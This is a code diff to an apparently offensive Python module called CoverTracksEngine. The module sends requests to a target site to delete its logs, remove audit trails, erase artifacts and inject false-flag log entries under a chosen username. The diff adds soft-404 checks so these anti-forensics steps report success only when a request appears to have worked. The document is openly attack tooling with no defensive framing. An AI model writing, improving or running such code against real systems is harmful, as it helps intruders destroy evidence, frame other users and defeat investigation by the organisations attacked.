@@ -8,6 +8,7 @@ import aiohttp
 import logging
 from typing import Dict, List, Any, Optional
 from .base import CoverTracksModule
+from .soft404 import is_soft404
 import time
 
 logger = logging.getLogger(__name__)
@@ -31,10 +32,12 @@ class CoverTracksEngine(CoverTracksModule):
         self.logs_deleted: int = 0
         self.artifacts_removed: int = 0
         self.traces_visible: bool = False
+        self._sig = None   # soft-404 baseline signature from recon
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute cover tracks operations using knowledge from all phases"""
         logger.info(f"[Cover] Starting cover tracks on {context.target_url}")
+        self._sig = getattr(context, "soft404_signature", None)
 
         results = await asyncio.gather(
             self._delete_logs(context.target_url),
@@ -87,6 +90,10 @@ class CoverTracksEngine(CoverTracksModule):
                                 timeout=aiohttp.ClientTimeout(total=12)
                             ) as resp:
                                 if resp.status in [200, 204]:
+                                    body = await resp.text(errors="replace")
+                                    if is_soft404(resp.status, body,
+                                                  resp.headers.get("Content-Type", ""), self._sig):
+                                        continue   # catch-all page, nothing was deleted
                                     logger.info(f"  ✓ Logs deleted via {endpoint}")
                                     self.logs_deleted += 1000  # Assume bulk deletion
                                     return {"success": True, "method": "log_deletion"}
@@ -121,6 +128,10 @@ class CoverTracksEngine(CoverTracksModule):
                         timeout=aiohttp.ClientTimeout(total=12)
                     ) as resp:
                         if resp.status in [200, 204]:
+                            body = await resp.text(errors="replace")
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page
                             logger.info(f"  ✓ Audit trail removed via {endpoint}")
                             self.artifacts_removed += 1
                             return {"success": True, "method": "audit_trail_removal"}
@@ -173,6 +184,10 @@ class CoverTracksEngine(CoverTracksModule):
                         timeout=aiohttp.ClientTimeout(total=8)
                     ) as resp:
                         if resp.status in [200, 201]:
+                            body = await resp.text(errors="replace")
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page, nothing was written
                             logger.info(f"  ✓ False flag log injected: {false_entry['username']}")
                             return {"success": True, "method": "false_flag", "target": false_entry["username"]}
 
@@ -205,6 +220,10 @@ class CoverTracksEngine(CoverTracksModule):
                         timeout=aiohttp.ClientTimeout(total=8)
                     ) as resp:
                         if resp.status in [200, 204]:
+                            body = await resp.text(errors="replace")
+                            if is_soft404(resp.status, body,
+                                          resp.headers.get("Content-Type", ""), self._sig):
+                                continue   # catch-all page
                             logger.info(f"  ✓ Artifacts erased via {endpoint}")
                             self.artifacts_removed += 1
                             return {"success": True, "method": "artifact_erasure"}
